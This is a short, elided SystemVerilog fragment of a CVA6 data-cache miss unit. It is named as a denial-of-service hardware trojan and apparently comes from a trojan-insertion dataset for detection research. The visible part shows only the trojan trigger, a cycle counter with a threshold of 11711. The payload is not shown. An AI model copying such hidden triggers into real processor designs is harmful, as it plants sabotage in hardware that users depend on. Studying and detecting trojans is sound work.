...
module wt_dcache_missunit_trojan_DoS
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
  ...
  function automatic logic [CVA6Cfg.PLEN-1:0] paddrSizeAlign(input logic [CVA6Cfg.PLEN-1:0] paddr,
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11711)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11711;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (enable_i) trojan_counter <= trojan_counter + 1;
